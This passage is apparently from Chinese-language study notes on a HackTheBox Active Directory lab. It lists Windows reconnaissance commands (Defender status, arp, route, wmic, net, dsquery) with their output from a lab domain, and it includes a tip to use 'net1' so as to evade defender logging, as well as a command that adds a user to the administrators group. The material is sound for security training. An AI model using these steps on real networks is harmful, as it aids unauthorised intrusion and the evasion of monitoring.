<h3 id="Windows-Defender-检查"><a href="#Windows-Defender-检查" class="headerlink" title="Windows Defender 检查"></a>Windows Defender 检查</h3><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\<span class="title">htb</span>&gt; <span class="title">sc</span> <span class="title">query</span> <span class="title">windefend</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">SERVICE_NAME</span>: <span class="title">windefend</span></span></span><br><span class="line"><span class="function">        <span class="title">TYPE</span>               : 10  <span class="title">WIN32_OWN_PROCESS</span></span></span><br><span class="line"><span class="function">        <span class="title">STATE</span>              : 4  <span class="title">RUNNING</span></span></span><br><span class="line"><span class="function">                                (<span class="title">STOPPABLE</span>, <span class="title">NOT_PAUSABLE</span>, <span class="title">ACCEPTS_SHUTDOWN</span>)</span></span><br><span class="line"><span class="function">        <span class="title">WIN32_EXIT_CODE</span>    : 0  (0<span class="title">x0</span>)</span></span><br><span class="line"><span class="function">        <span class="title">SERVICE_EXIT_CODE</span>  : 0  (0<span class="title">x0</span>)</span></span><br><span class="line"><span class="function">        <span class="title">CHECKPOINT</span>         : 0<span class="title">x0</span></span></span><br><span class="line"><span class="function">        <span class="title">WAIT_HINT</span>          : 0<span class="title">x0</span></span></span><br></pre></td></tr></table></figure>

<h3 id="Get-MpComputerStatus"><a href="#Get-MpComputerStatus" class="headerlink" title="Get-MpComputerStatus"></a>Get-MpComputerStatus</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\htb&gt; <span class="built_in">Get-MpComputerStatus</span></span><br><span class="line"></span><br><span class="line">AMEngineVersion                  : <span class="number">1.1</span>.<span class="number">19000.8</span></span><br><span class="line">AMProductVersion                 : <span class="number">4.18</span>.<span class="number">2202.4</span></span><br><span class="line">AMRunningMode                    : Normal</span><br><span class="line">AMServiceEnabled                 : True</span><br><span class="line">AMServiceVersion                 : <span class="number">4.18</span>.<span class="number">2202.4</span></span><br><span class="line">AntispywareEnabled               : True</span><br><span class="line">AntispywareSignatureAge          : <span class="number">0</span></span><br><span class="line">AntispywareSignatureLastUpdated  : <span class="number">3</span>/<span class="number">21</span>/<span class="number">2022</span> <span class="number">4</span>:<span class="number">06</span>:<span class="number">15</span> AM</span><br><span class="line">AntispywareSignatureVersion      : <span class="number">1.361</span>.<span class="number">414.0</span></span><br><span class="line">AntivirusEnabled                 : True</span><br><span class="line">AntivirusSignatureAge            : <span class="number">0</span></span><br><span class="line">AntivirusSignatureLastUpdated    : <span class="number">3</span>/<span class="number">21</span>/<span class="number">2022</span> <span class="number">4</span>:<span class="number">06</span>:<span class="number">16</span> AM</span><br><span class="line">AntivirusSignatureVersion        : <span class="number">1.361</span>.<span class="number">414.0</span></span><br><span class="line">BehaviorMonitorEnabled           : True</span><br><span class="line">ComputerID                       : FDA97E38<span class="literal">-1666-4534-98D4-943A9A871482</span></span><br><span class="line">ComputerState                    : <span class="number">0</span></span><br><span class="line">DefenderSignaturesOutOfDate      : False</span><br><span class="line">DeviceControlDefaultEnforcement  : Unknown</span><br><span class="line">DeviceControlPoliciesLastUpdated : <span class="number">3</span>/<span class="number">20</span>/<span class="number">2022</span> <span class="number">9</span>:<span class="number">08</span>:<span class="number">34</span> PM</span><br><span class="line">DeviceControlState               : Disabled</span><br><span class="line">FullScanAge                      : <span class="number">4294967295</span></span><br><span class="line">FullScanEndTime                  :</span><br><span class="line">FullScanOverdue                  : False</span><br><span class="line">FullScanRequired                 : False</span><br><span class="line">FullScanSignatureVersion         :</span><br><span class="line">FullScanStartTime                :</span><br><span class="line">IoavProtectionEnabled            : True</span><br><span class="line">IsTamperProtected                : True</span><br><span class="line">IsVirtualMachine                 : False</span><br><span class="line">LastFullScanSource               : <span class="number">0</span></span><br><span class="line">LastQuickScanSource              : <span class="number">2</span></span><br><span class="line"></span><br><span class="line">&lt;SNIP&gt;</span><br></pre></td></tr></table></figure>

<h2 id="Am-I-Alone"><a href="#Am-I-Alone" class="headerlink" title="Am I Alone?"></a>Am I Alone?</h2><h3 id="使用-qwinsta"><a href="#使用-qwinsta" class="headerlink" title="使用 qwinsta"></a>使用 qwinsta</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\htb&gt; qwinsta</span><br><span class="line"></span><br><span class="line"> SESSIONNAME       USERNAME                 ID  STATE   <span class="built_in">TYPE</span>        DEVICE</span><br><span class="line"> services                                    <span class="number">0</span>  Disc</span><br><span class="line">&gt;console           forend                    <span class="number">1</span>  Active</span><br><span class="line"> rdp<span class="literal">-tcp</span>                                 <span class="number">65536</span>  Listen</span><br></pre></td></tr></table></figure>

<h2 id="网络信息"><a href="#网络信息" class="headerlink" title="网络信息"></a>网络信息</h2><table>
<thead>
<tr>
<th><strong>网络命令</strong></th>
<th><strong>描述</strong></th>
</tr>
</thead>
<tbody><tr>
<td><code>arp -a</code></td>
<td>列出 ARP 表中存储的所有已知主机。</td>
</tr>
<tr>
<td><code>ipconfig /all</code></td>
<td>输出主机的适配器设置。我们可以从中确定网络段。</td>
</tr>
<tr>
<td><code>route print</code></td>
<td>显示路由表（IPv4 和 IPv6），识别已知网络及与主机共享的三层路由。</td>
</tr>
<tr>
<td><code>netsh advfirewall show allprofiles</code></td>
<td>显示主机防火墙的状态。我们可以确定它是否处于活动状态并过滤流量。</td>
</tr>
</tbody></table>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\htb&gt; arp <span class="literal">-a</span></span><br><span class="line"></span><br><span class="line">Interface: <span class="number">172.16</span>.<span class="number">5.25</span> <span class="literal">---</span> <span class="number">0</span>x8</span><br><span class="line">  Internet Address      Physical Address      <span class="built_in">Type</span></span><br><span class="line">  <span class="number">172.16</span>.<span class="number">5.5</span>            <span class="number">00</span><span class="literal">-50-56-b9-08-26</span>     dynamic</span><br><span class="line">  <span class="number">172.16</span>.<span class="number">5.130</span>          <span class="number">00</span><span class="literal">-50-56-b9-f0-e1</span>     dynamic</span><br><span class="line">  <span class="number">172.16</span>.<span class="number">5.240</span>          <span class="number">00</span><span class="literal">-50-56-b9-9d-66</span>     dynamic</span><br><span class="line">  <span class="number">224.0</span>.<span class="number">0.22</span>            <span class="number">01</span><span class="literal">-00-5e-00-00-16</span>     <span class="keyword">static</span></span><br><span class="line">  <span class="number">224.0</span>.<span class="number">0.251</span>           <span class="number">01</span><span class="literal">-00-5e-00-00-fb</span>     <span class="keyword">static</span></span><br><span class="line">  <span class="number">224.0</span>.<span class="number">0.252</span>           <span class="number">01</span><span class="literal">-00-5e-00-00-fc</span>     <span class="keyword">static</span></span><br><span class="line">  <span class="number">239.255</span>.<span class="number">255.250</span>       <span class="number">01</span><span class="literal">-00-5e-7f-ff-fa</span>     <span class="keyword">static</span></span><br><span class="line"></span><br><span class="line">Interface: <span class="number">10.129</span>.<span class="number">201.234</span> <span class="literal">---</span> <span class="number">0</span>xc</span><br><span class="line">  Internet Address      Physical Address      <span class="built_in">Type</span></span><br><span class="line">  <span class="number">10.129</span>.<span class="number">0.1</span>            <span class="number">00</span><span class="literal">-50-56-b9-b9-fc</span>     dynamic</span><br><span class="line">  <span class="number">10.129</span>.<span class="number">202.29</span>         <span class="number">00</span><span class="literal">-50-56-b9-26-8d</span>     dynamic</span><br><span class="line">  <span class="number">10.129</span>.<span class="number">255.255</span>        ff<span class="literal">-ff-ff-ff-ff-ff</span>     <span class="keyword">static</span></span><br><span class="line">  <span class="number">224.0</span>.<span class="number">0.22</span>            <span class="number">01</span><span class="literal">-00-5e-00-00-16</span>     <span class="keyword">static</span></span><br><span class="line">  <span class="number">224.0</span>.<span class="number">0.251</span>           <span class="number">01</span><span class="literal">-00-5e-00-00-fb</span>     <span class="keyword">static</span></span><br><span class="line">  <span class="number">224.0</span>.<span class="number">0.252</span>           <span class="number">01</span><span class="literal">-00-5e-00-00-fc</span>     <span class="keyword">static</span></span><br><span class="line">  <span class="number">239.255</span>.<span class="number">255.250</span>       <span class="number">01</span><span class="literal">-00-5e-7f-ff-fa</span>     <span class="keyword">static</span></span><br><span class="line">  <span class="number">255.255</span>.<span class="number">255.255</span>       ff<span class="literal">-ff-ff-ff-ff-ff</span>     <span class="keyword">static</span></span><br></pre></td></tr></table></figure>

<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\htb&gt; route print</span><br><span class="line"></span><br><span class="line">===========================================================================</span><br><span class="line">Interface List</span><br><span class="line">  <span class="number">8</span>...<span class="number">00</span> <span class="number">50</span> <span class="number">56</span> b9 <span class="number">9</span>d d9 ......vmxnet3 Ethernet Adapter <span class="comment">#2</span></span><br><span class="line"> <span class="number">12</span>...<span class="number">00</span> <span class="number">50</span> <span class="number">56</span> b9 de <span class="number">92</span> ......vmxnet3 Ethernet Adapter</span><br><span class="line">  <span class="number">1</span>...........................Software Loopback Interface <span class="number">1</span></span><br><span class="line">===========================================================================</span><br><span class="line"></span><br><span class="line">IPv4 Route Table</span><br><span class="line">===========================================================================</span><br><span class="line">Active Routes:</span><br><span class="line">Network Destination        Netmask          Gateway       Interface  Metric</span><br><span class="line">          <span class="number">0.0</span>.<span class="number">0.0</span>          <span class="number">0.0</span>.<span class="number">0.0</span>       <span class="number">172.16</span>.<span class="number">5.1</span>      <span class="number">172.16</span>.<span class="number">5.25</span>    <span class="number">261</span></span><br><span class="line">          <span class="number">0.0</span>.<span class="number">0.0</span>          <span class="number">0.0</span>.<span class="number">0.0</span>       <span class="number">10.129</span>.<span class="number">0.1</span>   <span class="number">10.129</span>.<span class="number">201.234</span>     <span class="number">20</span></span><br><span class="line">       <span class="number">10.129</span>.<span class="number">0.0</span>      <span class="number">255.255</span>.<span class="number">0.0</span>         On<span class="literal">-link</span>    <span class="number">10.129</span>.<span class="number">201.234</span>    <span class="number">266</span></span><br><span class="line">   <span class="number">10.129</span>.<span class="number">201.234</span>  <span class="number">255.255</span>.<span class="number">255.255</span>         On<span class="literal">-link</span>    <span class="number">10.129</span>.<span class="number">201.234</span>    <span class="number">266</span></span><br><span class="line">   <span class="number">10.129</span>.<span class="number">255.255</span>  <span class="number">255.255</span>.<span class="number">255.255</span>         On<span class="literal">-link</span>    <span class="number">10.129</span>.<span class="number">201.234</span>    <span class="number">266</span></span><br><span class="line">        <span class="number">127.0</span>.<span class="number">0.0</span>        <span class="number">255.0</span>.<span class="number">0.0</span>         On<span class="literal">-link</span>         <span class="number">127.0</span>.<span class="number">0.1</span>    <span class="number">331</span></span><br><span class="line">        <span class="number">127.0</span>.<span class="number">0.1</span>  <span class="number">255.255</span>.<span class="number">255.255</span>         On<span class="literal">-link</span>         <span class="number">127.0</span>.<span class="number">0.1</span>    <span class="number">331</span></span><br><span class="line">  <span class="number">127.255</span>.<span class="number">255.255</span>  <span class="number">255.255</span>.<span class="number">255.255</span>         On<span class="literal">-link</span>         <span class="number">127.0</span>.<span class="number">0.1</span>    <span class="number">331</span></span><br><span class="line">       <span class="number">172.16</span>.<span class="number">4.0</span>    <span class="number">255.255</span>.<span class="number">254.0</span>         On<span class="literal">-link</span>       <span class="number">172.16</span>.<span class="number">5.25</span>    <span class="number">261</span></span><br><span class="line">      <span class="number">172.16</span>.<span class="number">5.25</span>  <span class="number">255.255</span>.<span class="number">255.255</span>         On<span class="literal">-link</span>       <span class="number">172.16</span>.<span class="number">5.25</span>    <span class="number">261</span></span><br><span class="line">     <span class="number">172.16</span>.<span class="number">5.255</span>  <span class="number">255.255</span>.<span class="number">255.255</span>         On<span class="literal">-link</span>       <span class="number">172.16</span>.<span class="number">5.25</span>    <span class="number">261</span></span><br><span class="line">        <span class="number">224.0</span>.<span class="number">0.0</span>        <span class="number">240.0</span>.<span class="number">0.0</span>         On<span class="literal">-link</span>         <span class="number">127.0</span>.<span class="number">0.1</span>    <span class="number">331</span></span><br><span class="line">        <span class="number">224.0</span>.<span class="number">0.0</span>        <span class="number">240.0</span>.<span class="number">0.0</span>         On<span class="literal">-link</span>    <span class="number">10.129</span>.<span class="number">201.234</span>    <span class="number">266</span></span><br><span class="line">        <span class="number">224.0</span>.<span class="number">0.0</span>        <span class="number">240.0</span>.<span class="number">0.0</span>         On<span class="literal">-link</span>       <span class="number">172.16</span>.<span class="number">5.25</span>    <span class="number">261</span></span><br><span class="line">  <span class="number">255.255</span>.<span class="number">255.255</span>  <span class="number">255.255</span>.<span class="number">255.255</span>         On<span class="literal">-link</span>         <span class="number">127.0</span>.<span class="number">0.1</span>    <span class="number">331</span></span><br><span class="line">  <span class="number">255.255</span>.<span class="number">255.255</span>  <span class="number">255.255</span>.<span class="number">255.255</span>         On<span class="literal">-link</span>    <span class="number">10.129</span>.<span class="number">201.234</span>    <span class="number">266</span></span><br><span class="line">  <span class="number">255.255</span>.<span class="number">255.255</span>  <span class="number">255.255</span>.<span class="number">255.255</span>         On<span class="literal">-link</span>       <span class="number">172.16</span>.<span class="number">5.25</span>    <span class="number">261</span></span><br><span class="line">  ===========================================================================</span><br><span class="line">Persistent Routes:</span><br><span class="line">  Network Address          Netmask  Gateway Address  Metric</span><br><span class="line">          <span class="number">0.0</span>.<span class="number">0.0</span>          <span class="number">0.0</span>.<span class="number">0.0</span>       <span class="number">172.16</span>.<span class="number">5.1</span>  Default</span><br><span class="line">===========================================================================</span><br><span class="line"></span><br><span class="line">IPv6 Route Table</span><br><span class="line">===========================================================================</span><br><span class="line"></span><br><span class="line">&lt;SNIP&gt;</span><br></pre></td></tr></table></figure>

<h2 id="Windows-管理规范-WMI"><a href="#Windows-管理规范-WMI" class="headerlink" title="Windows 管理规范 (WMI)"></a>Windows 管理规范 (WMI)</h2><table>
<thead>
<tr>
<th><strong>命令</strong></th>
<th><strong>描述</strong></th>
</tr>
</thead>
<tbody><tr>
<td><code>wmic qfe get Caption,Description,HotFixID,InstalledOn</code></td>
<td>打印已应用的热修复补丁级别和描述</td>
</tr>
<tr>
<td><code>wmic computersystem get Name,Domain,Manufacturer,Model,Username,Roles /format:List</code></td>
<td>显示基本主机信息，包括列表中的任何属性</td>
</tr>
<tr>
<td><code>wmic process list /format:list</code></td>
<td>主机上所有进程的列表</td>
</tr>
<tr>
<td><code>wmic ntdomain list /format:list</code></td>
<td>显示有关域和域控制器的信息</td>
</tr>
<tr>
<td><code>wmic useraccount list /format:list</code></td>
<td>显示有关所有本地账户以及已登录该设备的域账户的信息</td>
</tr>
<tr>
<td><code>wmic group list /format:list</code></td>
<td>所有本地组的信息</td>
</tr>
<tr>
<td><code>wmic sysaccount list /format:list</code></td>
<td>转储有关作为服务帐户使用的任何系统帐户的信息。</td>
</tr>
</tbody></table>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\htb&gt; wmic ntdomain get Caption,Description,DnsForestName,DomainName,DomainControllerAddress</span><br><span class="line"></span><br><span class="line">Caption          Description      DnsForestName           DomainControllerAddress  DomainName</span><br><span class="line">ACADEMY<span class="literal">-EA-MS01</span>  ACADEMY<span class="literal">-EA-MS01</span></span><br><span class="line">INLANEFREIGHT    INLANEFREIGHT    INLANEFREIGHT.LOCAL     \\<span class="number">172.16</span>.<span class="number">5.5</span>             INLANEFREIGHT</span><br><span class="line">LOGISTICS        LOGISTICS        INLANEFREIGHT.LOCAL     \\<span class="number">172.16</span>.<span class="number">5.240</span>           LOGISTICS</span><br><span class="line">FREIGHTLOGISTIC  FREIGHTLOGISTIC  FREIGHTLOGISTICS.LOCAL  \\<span class="number">172.16</span>.<span class="number">5.238</span>           FREIGHTLOGISTIC</span><br></pre></td></tr></table></figure>

<h2 id="Net-Commands"><a href="#Net-Commands" class="headerlink" title="Net Commands"></a>Net Commands</h2><table>
<thead>
<tr>
<th><strong>命令</strong></th>
<th><strong>描述</strong></th>
</tr>
</thead>
<tbody><tr>
<td><code>net accounts</code></td>
<td>密码要求相关信息</td>
</tr>
<tr>
<td><code>net accounts /domain</code></td>
<td>密码与锁定策略</td>
</tr>
<tr>
<td><code>net group /domain</code></td>
<td>域组信息</td>
</tr>
<tr>
<td><code>net group &quot;Domain Admins&quot; /domain</code></td>
<td>列出具有域管理员权限的用户</td>
</tr>
<tr>
<td><code>net group &quot;domain computers&quot; /domain</code></td>
<td>连接到域的电脑列表</td>
</tr>
<tr>
<td><code>net group &quot;Domain Controllers&quot; /domain</code></td>
<td>列出域控制器的 PC 账户</td>
</tr>
<tr>
<td><code>net group &lt;domain_group_name&gt; /domain</code></td>
<td>属于该组的用户</td>
</tr>
<tr>
<td><code>net groups /domain</code></td>
<td>域组列表</td>
</tr>
<tr>
<td><code>net localgroup</code></td>
<td>所有可用组</td>
</tr>
<tr>
<td><code>net localgroup administrators /domain</code></td>
<td>列出域内属于管理员组的用户（默认包含组 <code>Domain Admins</code> ）</td>
</tr>
<tr>
<td><code>net localgroup Administrators</code></td>
<td>关于一个组（管理员）的信息</td>
</tr>
<tr>
<td><code>net localgroup administrators [username] /add</code></td>
<td>将用户添加到管理员组</td>
</tr>
<tr>
<td><code>net share</code></td>
<td>检查当前共享</td>
</tr>
<tr>
<td><code>net user &lt;ACCOUNT_NAME&gt; /domain</code></td>
<td>获取域内用户信息</td>
</tr>
<tr>
<td><code>net user /domain</code></td>
<td>列出域中的所有用户</td>
</tr>
<tr>
<td><code>net user %username%</code></td>
<td>当前用户的信息</td>
</tr>
<tr>
<td><code>net use x: \computer\share</code></td>
<td>本地挂载共享</td>
</tr>
<tr>
<td><code>net view</code></td>
<td>获取计算机列表</td>
</tr>
<tr>
<td><code>net view /all /domain[:domainname]</code></td>
<td>域中的共享</td>
</tr>
<tr>
<td><code>net view \computer /ALL</code></td>
<td>列出计算机的共享资源</td>
</tr>
<tr>
<td><code>net view /domain</code></td>
<td>域内计算机列表</td>
</tr>
</tbody></table>
<h3 id="列出域组"><a href="#列出域组" class="headerlink" title="列出域组"></a>列出域组</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\htb&gt; net <span class="built_in">group</span> /domain</span><br><span class="line"></span><br><span class="line">The request will be processed at a domain controller <span class="keyword">for</span> domain INLANEFREIGHT.LOCAL.</span><br><span class="line"></span><br><span class="line"><span class="built_in">Group</span> Accounts <span class="keyword">for</span> \\ACADEMY<span class="literal">-EA-DC01</span>.INLANEFREIGHT.LOCAL</span><br><span class="line"><span class="literal">-------------------------------------------------------------------------------</span></span><br><span class="line">*<span class="variable">$H25000</span><span class="literal">-1RTRKC5S507F</span></span><br><span class="line">*Accounting</span><br><span class="line">*Barracuda_all_access</span><br><span class="line">*Barracuda_facebook_access</span><br><span class="line">*Barracuda_parked_sites</span><br><span class="line">*Barracuda_youtube_exempt</span><br><span class="line">*Billing</span><br><span class="line">*Billing_users</span><br><span class="line">*Calendar Access</span><br><span class="line">*CEO</span><br><span class="line">*CFO</span><br><span class="line">*Cloneable Domain Controllers</span><br><span class="line">*Collaboration_users</span><br><span class="line">*Communications_users</span><br><span class="line">*Compliance Management</span><br><span class="line">*Computer <span class="built_in">Group</span> Management</span><br><span class="line">*Contractors</span><br><span class="line">*CTO</span><br><span class="line"></span><br><span class="line">&lt;SNIP&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\htb&gt; net user /domain wrouse</span><br><span class="line"></span><br><span class="line">The request will be processed at a domain controller <span class="keyword">for</span> domain INLANEFREIGHT.LOCAL.</span><br><span class="line"></span><br><span class="line">User name                    wrouse</span><br><span class="line">Full Name                    Christopher Davis</span><br><span class="line">Comment</span><br><span class="line">User<span class="string">&#x27;s comment</span></span><br><span class="line"><span class="string">Country/region code          000 (System Default)</span></span><br><span class="line"><span class="string">Account active               Yes</span></span><br><span class="line"><span class="string">Account expires              Never</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Password last set            10/27/2021 10:38:01 AM</span></span><br><span class="line"><span class="string">Password expires             Never</span></span><br><span class="line"><span class="string">Password changeable          10/28/2021 10:38:01 AM</span></span><br><span class="line"><span class="string">Password required            Yes</span></span><br><span class="line"><span class="string">User may change password     Yes</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Workstations allowed         All</span></span><br><span class="line"><span class="string">Logon script</span></span><br><span class="line"><span class="string">User profile</span></span><br><span class="line"><span class="string">Home directory</span></span><br><span class="line"><span class="string">Last logon                   Never</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Logon hours allowed          All</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Local Group Memberships</span></span><br><span class="line"><span class="string">Global Group memberships     *File Share G Drive   *File Share H Drive</span></span><br><span class="line"><span class="string">                             *Warehouse            *Printer Access</span></span><br><span class="line"><span class="string">                             *Domain Users         *VPN Users</span></span><br><span class="line"><span class="string">                             *Shared Calendar Read</span></span><br><span class="line"><span class="string">The command completed successfully.</span></span><br></pre></td></tr></table></figure>

<h3 id="Net-Command技巧"><a href="#Net-Command技巧" class="headerlink" title="Net Command技巧"></a>Net Command技巧</h3><p>如果你认为网络防御者正在积极记录&#x2F;寻找任何异常的命令，你可以尝试这个变通方法来使用网络命令。输入 <code>net1</code> 而不是 <code>net</code> 将执行相同的功能，而不会触发来自网络字符串的潜在警报。</p>
<h2 id="Dsquery-用户-计算机搜索"><a href="#Dsquery-用户-计算机搜索" class="headerlink" title="Dsquery 用户&#x2F;计算机搜索"></a>Dsquery 用户&#x2F;计算机搜索</h2><p>我们所需要的只是在主机上提升的权限或从 <code>SYSTEM</code> 上下文中运行命令提示符或 PowerShell 实例的能力。</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\htb&gt; dsquery user</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;CN=Administrator,CN=Users,DC=INLANEFREIGHT,DC=LOCAL&quot;</span></span><br><span class="line"><span class="string">&quot;CN=Guest,CN=Users,DC=INLANEFREIGHT,DC=LOCAL&quot;</span></span><br><span class="line"><span class="string">&quot;CN=lab_adm,CN=Users,DC=INLANEFREIGHT,DC=LOCAL&quot;</span></span><br><span class="line"><span class="string">&quot;CN=krbtgt,CN=Users,DC=INLANEFREIGHT,DC=LOCAL&quot;</span></span><br><span class="line"><span class="string">&quot;CN=Htb Student,CN=Users,DC=INLANEFREIGHT,DC=LOCAL&quot;</span></span><br><span class="line"><span class="string">&quot;CN=Annie Vazquez,OU=Finance,OU=Financial-LON,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL&quot;</span></span><br><span class="line"><span class="string">&quot;CN=Paul Falcon,OU=Finance,OU=Financial-LON,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL&quot;</span></span><br><span class="line"><span class="string">&quot;CN=Fae Anthony,OU=Finance,OU=Financial-LON,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL&quot;</span></span><br><span class="line"><span class="string">&quot;CN=Walter Dillard,OU=Finance,OU=Financial-LON,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL&quot;</span></span><br><span class="line"><span class="string">&quot;CN=Louis Bradford,OU=Finance,OU=Financial-LON,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL&quot;</span></span><br><span class="line"><span class="string">&quot;CN=Sonya Gage,OU=Finance,OU=Financial-LON,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL&quot;</span></span><br><span class="line"><span class="string">&quot;CN=Alba Sanchez,OU=Finance,OU=Financial-LON,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL&quot;</span></span><br><span class="line"><span class="string">&quot;CN=Daniel Branch,OU=Finance,OU=Financial-LON,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL&quot;</span></span><br><span class="line"><span class="string">&quot;CN=Christopher Cruz,OU=Finance,OU=Financial-LON,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL&quot;</span></span><br><span class="line"><span class="string">&quot;CN=Nicole Johnson,OU=Finance,OU=Financial-LON,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL&quot;</span></span><br><span class="line"><span class="string">&quot;CN=Mary Holliday,OU=Human Resources,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL&quot;</span></span><br><span class="line"><span class="string">&quot;CN=Michael Shoemaker,OU=Human Resources,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL&quot;</span></span><br><span class="line"><span class="string">&quot;CN=Arlene Slater,OU=Human Resources,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL&quot;</span></span><br><span class="line"><span class="string">&quot;CN=Kelsey Prentiss,OU=Human Resources,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL&quot;</span></span><br></pre></td></tr></table></figure>

